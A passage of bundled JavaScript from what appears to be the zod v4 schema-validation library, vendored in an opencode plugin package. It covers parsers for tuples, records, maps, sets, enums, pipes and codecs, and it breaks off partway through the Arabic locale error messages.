      const sharedValue = mergeValues2(a[key], b[key]);
      if (!sharedValue.valid) {
        return {
          valid: false,
          mergeErrorPath: [key, ...sharedValue.mergeErrorPath]
        };
      }
      newObj[key] = sharedValue.data;
    }
    return { valid: true, data: newObj };
  }
  if (Array.isArray(a) && Array.isArray(b)) {
    if (a.length !== b.length) {
      return { valid: false, mergeErrorPath: [] };
    }
    const newArray = [];
    for (let index = 0;index < a.length; index++) {
      const itemA = a[index];
      const itemB = b[index];
      const sharedValue = mergeValues2(itemA, itemB);
      if (!sharedValue.valid) {
        return {
          valid: false,
          mergeErrorPath: [index, ...sharedValue.mergeErrorPath]
        };
      }
      newArray.push(sharedValue.data);
    }
    return { valid: true, data: newArray };
  }
  return { valid: false, mergeErrorPath: [] };
}
function handleIntersectionResults2(result, left, right) {
  if (left.issues.length) {
    result.issues.push(...left.issues);
  }
  if (right.issues.length) {
    result.issues.push(...right.issues);
  }
  if (aborted2(result))
    return result;
  const merged = mergeValues2(left.value, right.value);
  if (!merged.valid) {
    throw new Error(`Unmergable intersection. Error path: ` + `${JSON.stringify(merged.mergeErrorPath)}`);
  }
  result.value = merged.data;
  return result;
}
var $ZodTuple2 = /* @__PURE__ */ $constructor2("$ZodTuple", (inst, def) => {
  $ZodType2.init(inst, def);
  const items = def.items;
  const optStart = items.length - [...items].reverse().findIndex((item) => item._zod.optin !== "optional");
  inst._zod.parse = (payload, ctx) => {
    const input = payload.value;
    if (!Array.isArray(input)) {
      payload.issues.push({
        input,
        inst,
        expected: "tuple",
        code: "invalid_type"
      });
      return payload;
    }
    payload.value = [];
    const proms = [];
    if (!def.rest) {
      const tooBig = input.length > items.length;
      const tooSmall = input.length < optStart - 1;
      if (tooBig || tooSmall) {
        payload.issues.push({
          ...tooBig ? { code: "too_big", maximum: items.length } : { code: "too_small", minimum: items.length },
          input,
          inst,
          origin: "array"
        });
        return payload;
      }
    }
    let i = -1;
    for (const item of items) {
      i++;
      if (i >= input.length) {
        if (i >= optStart)
          continue;
      }
      const result = item._zod.run({
        value: input[i],
        issues: []
      }, ctx);
      if (result instanceof Promise) {
        proms.push(result.then((result2) => handleTupleResult2(result2, payload, i)));
      } else {
        handleTupleResult2(result, payload, i);
      }
    }
    if (def.rest) {
      const rest = input.slice(items.length);
      for (const el of rest) {
        i++;
        const result = def.rest._zod.run({
          value: el,
          issues: []
        }, ctx);
        if (result instanceof Promise) {
          proms.push(result.then((result2) => handleTupleResult2(result2, payload, i)));
        } else {
          handleTupleResult2(result, payload, i);
        }
      }
    }
    if (proms.length)
      return Promise.all(proms).then(() => payload);
    return payload;
  };
});
function handleTupleResult2(result, final, index) {
  if (result.issues.length) {
    final.issues.push(...prefixIssues2(index, result.issues));
  }
  final.value[index] = result.value;
}
var $ZodRecord2 = /* @__PURE__ */ $constructor2("$ZodRecord", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.parse = (payload, ctx) => {
    const input = payload.value;
    if (!isPlainObject2(input)) {
      payload.issues.push({
        expected: "record",
        code: "invalid_type",
        input,
        inst
      });
      return payload;
    }
    const proms = [];
    if (def.keyType._zod.values) {
      const values = def.keyType._zod.values;
      payload.value = {};
      for (const key of values) {
        if (typeof key === "string" || typeof key === "number" || typeof key === "symbol") {
          const result = def.valueType._zod.run({ value: input[key], issues: [] }, ctx);
          if (result instanceof Promise) {
            proms.push(result.then((result2) => {
              if (result2.issues.length) {
                payload.issues.push(...prefixIssues2(key, result2.issues));
              }
              payload.value[key] = result2.value;
            }));
          } else {
            if (result.issues.length) {
              payload.issues.push(...prefixIssues2(key, result.issues));
            }
            payload.value[key] = result.value;
          }
        }
      }
      let unrecognized;
      for (const key in input) {
        if (!values.has(key)) {
          unrecognized = unrecognized ?? [];
          unrecognized.push(key);
        }
      }
      if (unrecognized && unrecognized.length > 0) {
        payload.issues.push({
          code: "unrecognized_keys",
          input,
          inst,
          keys: unrecognized
        });
      }
    } else {
      payload.value = {};
      for (const key of Reflect.ownKeys(input)) {
        if (key === "__proto__")
          continue;
        const keyResult = def.keyType._zod.run({ value: key, issues: [] }, ctx);
        if (keyResult instanceof Promise) {
          throw new Error("Async schemas not supported in object keys currently");
        }
        if (keyResult.issues.length) {
          payload.issues.push({
            code: "invalid_key",
            origin: "record",
            issues: keyResult.issues.map((iss) => finalizeIssue2(iss, ctx, config2())),
            input: key,
            path: [key],
            inst
          });
          payload.value[keyResult.value] = keyResult.value;
          continue;
        }
        const result = def.valueType._zod.run({ value: input[key], issues: [] }, ctx);
        if (result instanceof Promise) {
          proms.push(result.then((result2) => {
            if (result2.issues.length) {
              payload.issues.push(...prefixIssues2(key, result2.issues));
            }
            payload.value[keyResult.value] = result2.value;
          }));
        } else {
          if (result.issues.length) {
            payload.issues.push(...prefixIssues2(key, result.issues));
          }
          payload.value[keyResult.value] = result.value;
        }
      }
    }
    if (proms.length) {
      return Promise.all(proms).then(() => payload);
    }
    return payload;
  };
});
var $ZodMap2 = /* @__PURE__ */ $constructor2("$ZodMap", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.parse = (payload, ctx) => {
    const input = payload.value;
    if (!(input instanceof Map)) {
      payload.issues.push({
        expected: "map",
        code: "invalid_type",
        input,
        inst
      });
      return payload;
    }
    const proms = [];
    payload.value = new Map;
    for (const [key, value] of input) {
      const keyResult = def.keyType._zod.run({ value: key, issues: [] }, ctx);
      const valueResult = def.valueType._zod.run({ value, issues: [] }, ctx);
      if (keyResult instanceof Promise || valueResult instanceof Promise) {
        proms.push(Promise.all([keyResult, valueResult]).then(([keyResult2, valueResult2]) => {
          handleMapResult2(keyResult2, valueResult2, payload, key, input, inst, ctx);
        }));
      } else {
        handleMapResult2(keyResult, valueResult, payload, key, input, inst, ctx);
      }
    }
    if (proms.length)
      return Promise.all(proms).then(() => payload);
    return payload;
  };
});
function handleMapResult2(keyResult, valueResult, final, key, input, inst, ctx) {
  if (keyResult.issues.length) {
    if (propertyKeyTypes2.has(typeof key)) {
      final.issues.push(...prefixIssues2(key, keyResult.issues));
    } else {
      final.issues.push({
        code: "invalid_key",
        origin: "map",
        input,
        inst,
        issues: keyResult.issues.map((iss) => finalizeIssue2(iss, ctx, config2()))
      });
    }
  }
  if (valueResult.issues.length) {
    if (propertyKeyTypes2.has(typeof key)) {
      final.issues.push(...prefixIssues2(key, valueResult.issues));
    } else {
      final.issues.push({
        origin: "map",
        code: "invalid_element",
        input,
        inst,
        key,
        issues: valueResult.issues.map((iss) => finalizeIssue2(iss, ctx, config2()))
      });
    }
  }
  final.value.set(keyResult.value, valueResult.value);
}
var $ZodSet2 = /* @__PURE__ */ $constructor2("$ZodSet", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.parse = (payload, ctx) => {
    const input = payload.value;
    if (!(input instanceof Set)) {
      payload.issues.push({
        input,
        inst,
        expected: "set",
        code: "invalid_type"
      });
      return payload;
    }
    const proms = [];
    payload.value = new Set;
    for (const item of input) {
      const result = def.valueType._zod.run({ value: item, issues: [] }, ctx);
      if (result instanceof Promise) {
        proms.push(result.then((result2) => handleSetResult2(result2, payload)));
      } else
        handleSetResult2(result, payload);
    }
    if (proms.length)
      return Promise.all(proms).then(() => payload);
    return payload;
  };
});
function handleSetResult2(result, final) {
  if (result.issues.length) {
    final.issues.push(...result.issues);
  }
  final.value.add(result.value);
}
var $ZodEnum2 = /* @__PURE__ */ $constructor2("$ZodEnum", (inst, def) => {
  $ZodType2.init(inst, def);
  const values = getEnumValues2(def.entries);
  const valuesSet = new Set(values);
  inst._zod.values = valuesSet;
  inst._zod.pattern = new RegExp(`^(${values.filter((k) => propertyKeyTypes2.has(typeof k)).map((o) => typeof o === "string" ? escapeRegex2(o) : o.toString()).join("|")})$`);
  inst._zod.parse = (payload, _ctx) => {
    const input = payload.value;
    if (valuesSet.has(input)) {
      return payload;
    }
    payload.issues.push({
      code: "invalid_value",
      values,
      input,
      inst
    });
    return payload;
  };
});
var $ZodLiteral2 = /* @__PURE__ */ $constructor2("$ZodLiteral", (inst, def) => {
  $ZodType2.init(inst, def);
  if (def.values.length === 0) {
    throw new Error("Cannot create literal schema with no valid values");
  }
  inst._zod.values = new Set(def.values);
  inst._zod.pattern = new RegExp(`^(${def.values.map((o) => typeof o === "string" ? escapeRegex2(o) : o ? escapeRegex2(o.toString()) : String(o)).join("|")})$`);
  inst._zod.parse = (payload, _ctx) => {
    const input = payload.value;
    if (inst._zod.values.has(input)) {
      return payload;
    }
    payload.issues.push({
      code: "invalid_value",
      values: def.values,
      input,
      inst
    });
    return payload;
  };
});
var $ZodFile2 = /* @__PURE__ */ $constructor2("$ZodFile", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.parse = (payload, _ctx) => {
    const input = payload.value;
    if (input instanceof File)
      return payload;
    payload.issues.push({
      expected: "file",
      code: "invalid_type",
      input,
      inst
    });
    return payload;
  };
});
var $ZodTransform2 = /* @__PURE__ */ $constructor2("$ZodTransform", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.parse = (payload, ctx) => {
    if (ctx.direction === "backward") {
      throw new $ZodEncodeError2(inst.constructor.name);
    }
    const _out = def.transform(payload.value, payload);
    if (ctx.async) {
      const output = _out instanceof Promise ? _out : Promise.resolve(_out);
      return output.then((output2) => {
        payload.value = output2;
        return payload;
      });
    }
    if (_out instanceof Promise) {
      throw new $ZodAsyncError2;
    }
    payload.value = _out;
    return payload;
  };
});
function handleOptionalResult2(result, input) {
  if (result.issues.length && input === undefined) {
    return { issues: [], value: undefined };
  }
  return result;
}
var $ZodOptional2 = /* @__PURE__ */ $constructor2("$ZodOptional", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.optin = "optional";
  inst._zod.optout = "optional";
  defineLazy2(inst._zod, "values", () => {
    return def.innerType._zod.values ? new Set([...def.innerType._zod.values, undefined]) : undefined;
  });
  defineLazy2(inst._zod, "pattern", () => {
    const pattern = def.innerType._zod.pattern;
    return pattern ? new RegExp(`^(${cleanRegex2(pattern.source)})?$`) : undefined;
  });
  inst._zod.parse = (payload, ctx) => {
    if (def.innerType._zod.optin === "optional") {
      const result = def.innerType._zod.run(payload, ctx);
      if (result instanceof Promise)
        return result.then((r) => handleOptionalResult2(r, payload.value));
      return handleOptionalResult2(result, payload.value);
    }
    if (payload.value === undefined) {
      return payload;
    }
    return def.innerType._zod.run(payload, ctx);
  };
});
var $ZodNullable2 = /* @__PURE__ */ $constructor2("$ZodNullable", (inst, def) => {
  $ZodType2.init(inst, def);
  defineLazy2(inst._zod, "optin", () => def.innerType._zod.optin);
  defineLazy2(inst._zod, "optout", () => def.innerType._zod.optout);
  defineLazy2(inst._zod, "pattern", () => {
    const pattern = def.innerType._zod.pattern;
    return pattern ? new RegExp(`^(${cleanRegex2(pattern.source)}|null)$`) : undefined;
  });
  defineLazy2(inst._zod, "values", () => {
    return def.innerType._zod.values ? new Set([...def.innerType._zod.values, null]) : undefined;
  });
  inst._zod.parse = (payload, ctx) => {
    if (payload.value === null)
      return payload;
    return def.innerType._zod.run(payload, ctx);
  };
});
var $ZodDefault2 = /* @__PURE__ */ $constructor2("$ZodDefault", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.optin = "optional";
  defineLazy2(inst._zod, "values", () => def.innerType._zod.values);
  inst._zod.parse = (payload, ctx) => {
    if (ctx.direction === "backward") {
      return def.innerType._zod.run(payload, ctx);
    }
    if (payload.value === undefined) {
      payload.value = def.defaultValue;
      return payload;
    }
    const result = def.innerType._zod.run(payload, ctx);
    if (result instanceof Promise) {
      return result.then((result2) => handleDefaultResult2(result2, def));
    }
    return handleDefaultResult2(result, def);
  };
});
function handleDefaultResult2(payload, def) {
  if (payload.value === undefined) {
    payload.value = def.defaultValue;
  }
  return payload;
}
var $ZodPrefault2 = /* @__PURE__ */ $constructor2("$ZodPrefault", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.optin = "optional";
  defineLazy2(inst._zod, "values", () => def.innerType._zod.values);
  inst._zod.parse = (payload, ctx) => {
    if (ctx.direction === "backward") {
      return def.innerType._zod.run(payload, ctx);
    }
    if (payload.value === undefined) {
      payload.value = def.defaultValue;
    }
    return def.innerType._zod.run(payload, ctx);
  };
});
var $ZodNonOptional2 = /* @__PURE__ */ $constructor2("$ZodNonOptional", (inst, def) => {
  $ZodType2.init(inst, def);
  defineLazy2(inst._zod, "values", () => {
    const v = def.innerType._zod.values;
    return v ? new Set([...v].filter((x) => x !== undefined)) : undefined;
  });
  inst._zod.parse = (payload, ctx) => {
    const result = def.innerType._zod.run(payload, ctx);
    if (result instanceof Promise) {
      return result.then((result2) => handleNonOptionalResult2(result2, inst));
    }
    return handleNonOptionalResult2(result, inst);
  };
});
function handleNonOptionalResult2(payload, inst) {
  if (!payload.issues.length && payload.value === undefined) {
    payload.issues.push({
      code: "invalid_type",
      expected: "nonoptional",
      input: payload.value,
      inst
    });
  }
  return payload;
}
var $ZodSuccess2 = /* @__PURE__ */ $constructor2("$ZodSuccess", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.parse = (payload, ctx) => {
    if (ctx.direction === "backward") {
      throw new $ZodEncodeError2("ZodSuccess");
    }
    const result = def.innerType._zod.run(payload, ctx);
    if (result instanceof Promise) {
      return result.then((result2) => {
        payload.value = result2.issues.length === 0;
        return payload;
      });
    }
    payload.value = result.issues.length === 0;
    return payload;
  };
});
var $ZodCatch2 = /* @__PURE__ */ $constructor2("$ZodCatch", (inst, def) => {
  $ZodType2.init(inst, def);
  defineLazy2(inst._zod, "optin", () => def.innerType._zod.optin);
  defineLazy2(inst._zod, "optout", () => def.innerType._zod.optout);
  defineLazy2(inst._zod, "values", () => def.innerType._zod.values);
  inst._zod.parse = (payload, ctx) => {
    if (ctx.direction === "backward") {
      return def.innerType._zod.run(payload, ctx);
    }
    const result = def.innerType._zod.run(payload, ctx);
    if (result instanceof Promise) {
      return result.then((result2) => {
        payload.value = result2.value;
        if (result2.issues.length) {
          payload.value = def.catchValue({
            ...payload,
            error: {
              issues: result2.issues.map((iss) => finalizeIssue2(iss, ctx, config2()))
            },
            input: payload.value
          });
          payload.issues = [];
        }
        return payload;
      });
    }
    payload.value = result.value;
    if (result.issues.length) {
      payload.value = def.catchValue({
        ...payload,
        error: {
          issues: result.issues.map((iss) => finalizeIssue2(iss, ctx, config2()))
        },
        input: payload.value
      });
      payload.issues = [];
    }
    return payload;
  };
});
var $ZodNaN2 = /* @__PURE__ */ $constructor2("$ZodNaN", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.parse = (payload, _ctx) => {
    if (typeof payload.value !== "number" || !Number.isNaN(payload.value)) {
      payload.issues.push({
        input: payload.value,
        inst,
        expected: "nan",
        code: "invalid_type"
      });
      return payload;
    }
    return payload;
  };
});
var $ZodPipe2 = /* @__PURE__ */ $constructor2("$ZodPipe", (inst, def) => {
  $ZodType2.init(inst, def);
  defineLazy2(inst._zod, "values", () => def.in._zod.values);
  defineLazy2(inst._zod, "optin", () => def.in._zod.optin);
  defineLazy2(inst._zod, "optout", () => def.out._zod.optout);
  defineLazy2(inst._zod, "propValues", () => def.in._zod.propValues);
  inst._zod.parse = (payload, ctx) => {
    if (ctx.direction === "backward") {
      const right = def.out._zod.run(payload, ctx);
      if (right instanceof Promise) {
        return right.then((right2) => handlePipeResult2(right2, def.in, ctx));
      }
      return handlePipeResult2(right, def.in, ctx);
    }
    const left = def.in._zod.run(payload, ctx);
    if (left instanceof Promise) {
      return left.then((left2) => handlePipeResult2(left2, def.out, ctx));
    }
    return handlePipeResult2(left, def.out, ctx);
  };
});
function handlePipeResult2(left, next, ctx) {
  if (left.issues.length) {
    left.aborted = true;
    return left;
  }
  return next._zod.run({ value: left.value, issues: left.issues }, ctx);
}
var $ZodCodec2 = /* @__PURE__ */ $constructor2("$ZodCodec", (inst, def) => {
  $ZodType2.init(inst, def);
  defineLazy2(inst._zod, "values", () => def.in._zod.values);
  defineLazy2(inst._zod, "optin", () => def.in._zod.optin);
  defineLazy2(inst._zod, "optout", () => def.out._zod.optout);
  defineLazy2(inst._zod, "propValues", () => def.in._zod.propValues);
  inst._zod.parse = (payload, ctx) => {
    const direction = ctx.direction || "forward";
    if (direction === "forward") {
      const left = def.in._zod.run(payload, ctx);
      if (left instanceof Promise) {
        return left.then((left2) => handleCodecAResult2(left2, def, ctx));
      }
      return handleCodecAResult2(left, def, ctx);
    } else {
      const right = def.out._zod.run(payload, ctx);
      if (right instanceof Promise) {
        return right.then((right2) => handleCodecAResult2(right2, def, ctx));
      }
      return handleCodecAResult2(right, def, ctx);
    }
  };
});
function handleCodecAResult2(result, def, ctx) {
  if (result.issues.length) {
    result.aborted = true;
    return result;
  }
  const direction = ctx.direction || "forward";
  if (direction === "forward") {
    const transformed = def.transform(result.value, result);
    if (transformed instanceof Promise) {
      return transformed.then((value) => handleCodecTxResult2(result, value, def.out, ctx));
    }
    return handleCodecTxResult2(result, transformed, def.out, ctx);
  } else {
    const transformed = def.reverseTransform(result.value, result);
    if (transformed instanceof Promise) {
      return transformed.then((value) => handleCodecTxResult2(result, value, def.in, ctx));
    }
    return handleCodecTxResult2(result, transformed, def.in, ctx);
  }
}
function handleCodecTxResult2(left, value, nextSchema, ctx) {
  if (left.issues.length) {
    left.aborted = true;
    return left;
  }
  return nextSchema._zod.run({ value, issues: left.issues }, ctx);
}
var $ZodReadonly2 = /* @__PURE__ */ $constructor2("$ZodReadonly", (inst, def) => {
  $ZodType2.init(inst, def);
  defineLazy2(inst._zod, "propValues", () => def.innerType._zod.propValues);
  defineLazy2(inst._zod, "values", () => def.innerType._zod.values);
  defineLazy2(inst._zod, "optin", () => def.innerType._zod.optin);
  defineLazy2(inst._zod, "optout", () => def.innerType._zod.optout);
  inst._zod.parse = (payload, ctx) => {
    if (ctx.direction === "backward") {
      return def.innerType._zod.run(payload, ctx);
    }
    const result = def.innerType._zod.run(payload, ctx);
    if (result instanceof Promise) {
      return result.then(handleReadonlyResult2);
    }
    return handleReadonlyResult2(result);
  };
});
function handleReadonlyResult2(payload) {
  payload.value = Object.freeze(payload.value);
  return payload;
}
var $ZodTemplateLiteral2 = /* @__PURE__ */ $constructor2("$ZodTemplateLiteral", (inst, def) => {
  $ZodType2.init(inst, def);
  const regexParts = [];
  for (const part of def.parts) {
    if (typeof part === "object" && part !== null) {
      if (!part._zod.pattern) {
        throw new Error(`Invalid template literal part, no pattern found: ${[...part._zod.traits].shift()}`);
      }
      const source = part._zod.pattern instanceof RegExp ? part._zod.pattern.source : part._zod.pattern;
      if (!source)
        throw new Error(`Invalid template literal part: ${part._zod.traits}`);
      const start = source.startsWith("^") ? 1 : 0;
      const end = source.endsWith("$") ? source.length - 1 : source.length;
      regexParts.push(source.slice(start, end));
    } else if (part === null || primitiveTypes2.has(typeof part)) {
      regexParts.push(escapeRegex2(`${part}`));
    } else {
      throw new Error(`Invalid template literal part: ${part}`);
    }
  }
  inst._zod.pattern = new RegExp(`^${regexParts.join("")}$`);
  inst._zod.parse = (payload, _ctx) => {
    if (typeof payload.value !== "string") {
      payload.issues.push({
        input: payload.value,
        inst,
        expected: "template_literal",
        code: "invalid_type"
      });
      return payload;
    }
    inst._zod.pattern.lastIndex = 0;
    if (!inst._zod.pattern.test(payload.value)) {
      payload.issues.push({
        input: payload.value,
        inst,
        code: "invalid_format",
        format: def.format ?? "template_literal",
        pattern: inst._zod.pattern.source
      });
      return payload;
    }
    return payload;
  };
});
var $ZodFunction2 = /* @__PURE__ */ $constructor2("$ZodFunction", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._def = def;
  inst._zod.def = def;
  inst.implement = (func) => {
    if (typeof func !== "function") {
      throw new Error("implement() must be called with a function");
    }
    return function(...args) {
      const parsedArgs = inst._def.input ? parse5(inst._def.input, args) : args;
      const result = Reflect.apply(func, this, parsedArgs);
      if (inst._def.output) {
        return parse5(inst._def.output, result);
      }
      return result;
    };
  };
  inst.implementAsync = (func) => {
    if (typeof func !== "function") {
      throw new Error("implementAsync() must be called with a function");
    }
    return async function(...args) {
      const parsedArgs = inst._def.input ? await parseAsync3(inst._def.input, args) : args;
      const result = await Reflect.apply(func, this, parsedArgs);
      if (inst._def.output) {
        return await parseAsync3(inst._def.output, result);
      }
      return result;
    };
  };
  inst._zod.parse = (payload, _ctx) => {
    if (typeof payload.value !== "function") {
      payload.issues.push({
        code: "invalid_type",
        expected: "function",
        input: payload.value,
        inst
      });
      return payload;
    }
    const hasPromiseOutput = inst._def.output && inst._def.output._zod.def.type === "promise";
    if (hasPromiseOutput) {
      payload.value = inst.implementAsync(payload.value);
    } else {
      payload.value = inst.implement(payload.value);
    }
    return payload;
  };
  inst.input = (...args) => {
    const F = inst.constructor;
    if (Array.isArray(args[0])) {
      return new F({
        type: "function",
        input: new $ZodTuple2({
          type: "tuple",
          items: args[0],
          rest: args[1]
        }),
        output: inst._def.output
      });
    }
    return new F({
      type: "function",
      input: args[0],
      output: inst._def.output
    });
  };
  inst.output = (output) => {
    const F = inst.constructor;
    return new F({
      type: "function",
      input: inst._def.input,
      output
    });
  };
  return inst;
});
var $ZodPromise2 = /* @__PURE__ */ $constructor2("$ZodPromise", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.parse = (payload, ctx) => {
    return Promise.resolve(payload.value).then((inner) => def.innerType._zod.run({ value: inner, issues: [] }, ctx));
  };
});
var $ZodLazy2 = /* @__PURE__ */ $constructor2("$ZodLazy", (inst, def) => {
  $ZodType2.init(inst, def);
  defineLazy2(inst._zod, "innerType", () => def.getter());
  defineLazy2(inst._zod, "pattern", () => inst._zod.innerType._zod.pattern);
  defineLazy2(inst._zod, "propValues", () => inst._zod.innerType._zod.propValues);
  defineLazy2(inst._zod, "optin", () => inst._zod.innerType._zod.optin ?? undefined);
  defineLazy2(inst._zod, "optout", () => inst._zod.innerType._zod.optout ?? undefined);
  inst._zod.parse = (payload, ctx) => {
    const inner = inst._zod.innerType;
    return inner._zod.run(payload, ctx);
  };
});
var $ZodCustom2 = /* @__PURE__ */ $constructor2("$ZodCustom", (inst, def) => {
  $ZodCheck2.init(inst, def);
  $ZodType2.init(inst, def);
  inst._zod.parse = (payload, _) => {
    return payload;
  };
  inst._zod.check = (payload) => {
    const input = payload.value;
    const r = def.fn(input);
    if (r instanceof Promise) {
      return r.then((r2) => handleRefineResult2(r2, payload, input, inst));
    }
    handleRefineResult2(r, payload, input, inst);
    return;
  };
});
function handleRefineResult2(result, payload, input, inst) {
  if (!result) {
    const _iss = {
      code: "custom",
      input,
      inst,
      path: [...inst._zod.def.path ?? []],
      continue: !inst._zod.def.abort
    };
    if (inst._zod.def.params)
      _iss.params = inst._zod.def.params;
    payload.issues.push(issue2(_iss));
  }
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/index.js
var exports_locales2 = {};
__export(exports_locales2, {
  zhTW: () => zh_TW_default2,
  zhCN: () => zh_CN_default2,
  yo: () => yo_default2,
  vi: () => vi_default2,
  ur: () => ur_default2,
  uk: () => uk_default2,
  ua: () => ua_default2,
  tr: () => tr_default2,
  th: () => th_default2,
  ta: () => ta_default2,
  sv: () => sv_default2,
  sl: () => sl_default2,
  ru: () => ru_default2,
  pt: () => pt_default2,
  ps: () => ps_default2,
  pl: () => pl_default2,
  ota: () => ota_default2,
  no: () => no_default2,
  nl: () => nl_default2,
  ms: () => ms_default2,
  mk: () => mk_default2,
  lt: () => lt_default2,
  ko: () => ko_default2,
  km: () => km_default2,
  kh: () => kh_default2,
  ka: () => ka_default2,
  ja: () => ja_default2,
  it: () => it_default2,
  is: () => is_default2,
  id: () => id_default2,
  hu: () => hu_default2,
  he: () => he_default2,
  frCA: () => fr_CA_default2,
  fr: () => fr_default2,
  fi: () => fi_default2,
  fa: () => fa_default2,
  es: () => es_default2,
  eo: () => eo_default2,
  en: () => en_default2,
  de: () => de_default2,
  da: () => da_default2,
  cs: () => cs_default2,
  ca: () => ca_default2,
  be: () => be_default2,
  az: () => az_default2,
  ar: () => ar_default2
});

// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/ar.js
var error48 = () => {
  const Sizable = {
    string: { unit: "\u062D\u0631\u0641", verb: "\u0623\u0646 \u064A\u062D\u0648\u064A" },
    file: { unit: "\u0628\u0627\u064A\u062A", verb: "\u0623\u0646 \u064A\u062D\u0648\u064A" },
    array: { unit: "\u0639\u0646\u0635\u0631", verb: "\u0623\u0646 \u064A\u062D\u0648\u064A" },
    set: { unit: "\u0639\u0646\u0635\u0631", verb: "\u0623\u0646 \u064A\u062D\u0648\u064A" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType2 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "number";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "array";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "\u0645\u062F\u062E\u0644",
    email: "\u0628\u0631\u064A\u062F \u0625\u0644\u0643\u062A\u0631\u0648\u0646\u064A",
    url: "\u0631\u0627\u0628\u0637",
    emoji: "\u0625\u064A\u0645\u0648\u062C\u064A",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "\u062A\u0627\u0631\u064A\u062E \u0648\u0648\u0642\u062A \u0628\u0645\u0639\u064A\u0627\u0631 ISO",
    date: "\u062A\u0627\u0631\u064A\u062E \u0628\u0645\u0639\u064A\u0627\u0631 ISO",
    time: "\u0648\u0642\u062A \u0628\u0645\u0639\u064A\u0627\u0631 ISO",
    duration: "\u0645\u062F\u0629 \u0628\u0645\u0639\u064A\u0627\u0631 ISO",
    ipv4: "\u0639\u0646\u0648\u0627\u0646 IPv4",
    ipv6: "\u0639\u0646\u0648\u0627\u0646 IPv6",
    cidrv4: "\u0645\u062F\u0649 \u0639\u0646\u0627\u0648\u064A\u0646 \u0628\u0635\u064A\u063A\u0629 IPv4",
    cidrv6: "\u0645\u062F\u0649 \u0639\u0646\u0627\u0648\u064A\u0646 \u0628\u0635\u064A\u063A\u0629 IPv6",
    base64: "\u0646\u064E\u0635 \u0628\u062A\u0631\u0645\u064A\u0632 base64-encoded",
    base64url: "\u0646\u064E\u0635 \u0628\u062A\u0631\u0645\u064A\u0632 base64url-encoded",
    json_string: "\u0646\u064E\u0635 \u0639\u0644\u0649 \u0647\u064A\u0626\u0629 JSON",
    e164: "\u0631\u0642\u0645 \u0647\u0627\u062A\u0641 \u0628\u0645\u0639\u064A\u0627\u0631 E.164",
    jwt: "JWT",
    template_literal: "\u0645\u062F\u062E\u0644"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\u0645\u062F\u062E\u0644\u0627\u062A \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644\u0629: \u064A\u0641\u062A\u0631\u0636 \u0625\u062F\u062E\u0627\u0644 ${issue3.expected}\u060C \u0648\u0644\u0643\u0646 \u062A\u0645 \u0625\u062F\u062E\u0627\u0644 ${parsedType2(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `\u0645\u062F\u062E\u0644\u0627\u062A \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644\u0629: \u064A\u0641\u062A\u0631\u0636 \u0625\u062F\u062E\u0627\u0644 ${stringifyPrimitive2(issue3.values[0])}`;
        return `\u0627\u062E\u062A\u064A\u0627\u0631 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644: \u064A\u062A\u0648\u0642\u0639 \u0627\u0646\u062A\u0642\u0627\u0621 \u0623\u062D\u062F \u0647\u0630\u0647 \u0627\u0644\u062E\u064A\u0627\u0631\u0627\u062A: ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return ` \u0623\u0643\u0628\u0631 \u0645\u0646 \u0627\u0644\u0644\u0627\u0632\u0645: \u064A\u0641\u062A\u0631\u0636 \u0623\u0646 \u062A\u0643\u0648\u0646 ${issue3.origin ?? "\u0627\u0644\u0642\u064A\u0645\u0629"} ${adj} ${issue3.maximum.toString()} ${sizing.unit ?? "\u0639\u0646\u0635\u0631"}`;
        return `\u0623\u0643\u0628\u0631 \u0645\u0646 \u0627\u0644\u0644\u0627\u0632\u0645: \u064A\u0641\u062A\u0631\u0636 \u0623\u0646 \u062A\u0643\u0648\u0646 ${issue3.origin ?? "\u0627\u0644\u0642\u064A\u0645\u0629"} ${adj} ${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `\u0623\u0635\u063A\u0631 \u0645\u0646 \u0627\u0644\u0644\u0627\u0632\u0645: \u064A\u0641\u062A\u0631\u0636 \u0644\u0640 ${issue3.origin} \u0623\u0646 \u064A\u0643\u0648\u0646 ${adj} ${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `\u0623\u0635\u063A\u0631 \u0645\u0646 \u0627\u0644\u0644\u0627\u0632\u0645: \u064A\u0641\u062A\u0631\u0636 \u0644\u0640 ${issue3.origin} \u0623\u0646 \u064A\u0643\u0648\u0646 ${adj} ${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
